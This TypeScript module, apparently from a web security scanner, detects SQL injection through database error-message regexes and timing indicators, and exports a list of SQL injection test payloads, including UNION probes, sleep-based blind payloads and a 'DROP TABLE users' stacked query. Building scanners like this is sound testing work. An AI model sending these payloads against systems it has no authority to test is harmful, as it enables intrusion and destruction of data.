import { CrawlResponse } from '../../crawler/webcrawler.js';

export interface PatternMatch {
    type: 'sqli' | 'xss' | 'idor' | 'info_disclosure' | 'ssrf' | 'cmd_injection';
    severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
    pattern: string;
    match: string;
    context: string;
    confidence: number;
}

// SQL error patterns that indicate potential SQL injection
const SQL_ERROR_PATTERNS = [
    { pattern: /SQL syntax.*MySQL/i, db: 'MySQL' },
    { pattern: /Warning.*mysql_/i, db: 'MySQL' },
    { pattern: /MySqlException/i, db: 'MySQL' },
    { pattern: /valid MySQL result/i, db: 'MySQL' },
    { pattern: /PostgreSQL.*ERROR/i, db: 'PostgreSQL' },
    { pattern: /pg_query\(\)/i, db: 'PostgreSQL' },
    { pattern: /PSQLException/i, db: 'PostgreSQL' },
    { pattern: /Microsoft.*ODBC.*SQL Server/i, db: 'MSSQL' },
    { pattern: /Microsoft.*SQL.*Native.*Client/i, db: 'MSSQL' },
    { pattern: /SQLServerException/i, db: 'MSSQL' },
    { pattern: /Unclosed quotation mark/i, db: 'MSSQL' },
    { pattern: /ORA-\d{5}/i, db: 'Oracle' },
    { pattern: /Oracle.*Driver/i, db: 'Oracle' },
    { pattern: /SQLite.*error/i, db: 'SQLite' },
    { pattern: /SQLITE_ERROR/i, db: 'SQLite' },
    { pattern: /sqlite3\.OperationalError/i, db: 'SQLite' },
    { pattern: /System\.Data\.SQLite/i, db: 'SQLite' },
    { pattern: /JDBC.*SQLException/i, db: 'Generic' },
    { pattern: /quoted string not properly terminated/i, db: 'Generic' },
    { pattern: /SQL command not properly ended/i, db: 'Generic' },
    { pattern: /unexpected end of SQL command/i, db: 'Generic' },
];

// Patterns that suggest potential blind SQL injection
const BLIND_SQLI_INDICATORS = [
    /sleep\s*\(\s*\d+\s*\)/i,
    /waitfor\s+delay/i,
    /benchmark\s*\(/i,
    /pg_sleep\s*\(/i,
];

export function detectSqlInjection(response: CrawlResponse): PatternMatch[] {
    const matches: PatternMatch[] = [];
    const body = response.body;

    // Check for SQL error messages
    for (const { pattern, db } of SQL_ERROR_PATTERNS) {
        const match = body.match(pattern);
        if (match) {
            matches.push({
                type: 'sqli',
                severity: 'high',
                pattern: pattern.source,
                match: match[0],
                context: `SQL error from ${db} database detected in response`,
                confidence: 0.9,
            });
        }
    }

    // Check request parameters for SQLi payloads that might have been reflected
    const sqliPayloads = ["'", '"', '--', '/*', '*/', 'OR 1=1', 'AND 1=1', 'UNION SELECT'];
    for (const param of response.request.parameters) {
        for (const payload of sqliPayloads) {
            if (param.value.includes(payload)) {
                // If the payload is in the request and we got SQL errors, high confidence
                if (matches.length > 0) {
                    matches[0].confidence = 0.95;
                    matches[0].context += ` (payload "${payload}" in parameter "${param.name}")`;
                }
            }
        }
    }

    // Check for blind SQLi timing indicators
    for (const pattern of BLIND_SQLI_INDICATORS) {
        if (pattern.test(body)) {
            matches.push({
                type: 'sqli',
                severity: 'high',
                pattern: pattern.source,
                match: 'Blind SQLi indicator',
                context: 'Response contains SQL timing function - possible blind SQL injection',
                confidence: 0.7,
            });
        }
    }

    return matches;
}

// SQL injection test payloads
export const SQLI_PAYLOADS = [
    // Error-based
    { payload: "'", purpose: 'Single quote - basic error test' },
    { payload: "''", purpose: 'Double single quote - escape test' },
    { payload: '"', purpose: 'Double quote - error test' },
    { payload: '`', purpose: 'Backtick - MySQL specific' },
    { payload: "' OR '1'='1", purpose: 'Classic OR injection' },
    { payload: "' OR '1'='1' --", purpose: 'OR with comment' },
    { payload: "' OR '1'='1' #", purpose: 'OR with MySQL comment' },
    { payload: "1' ORDER BY 1--", purpose: 'Column count test' },
    { payload: "1' ORDER BY 10--", purpose: 'Column count test (high)' },
    { payload: "' UNION SELECT NULL--", purpose: 'UNION injection test' },
    { payload: "' UNION SELECT NULL,NULL--", purpose: 'UNION 2 columns' },
    { payload: "'; SELECT SLEEP(5)--", purpose: 'Time-based blind (MySQL)' },
    { payload: "'; WAITFOR DELAY '0:0:5'--", purpose: 'Time-based blind (MSSQL)' },
    { payload: "' AND 1=1--", purpose: 'Boolean-based blind (true)' },
    { payload: "' AND 1=2--", purpose: 'Boolean-based blind (false)' },

    // Integer-based
    { payload: '1 OR 1=1', purpose: 'Integer OR injection' },
    { payload: '1 AND 1=1', purpose: 'Integer AND true' },
    { payload: '1 AND 1=2', purpose: 'Integer AND false' },

    // Stacked queries
    { payload: "'; DROP TABLE users--", purpose: 'Stacked query test (DO NOT USE IN PROD)' },
];
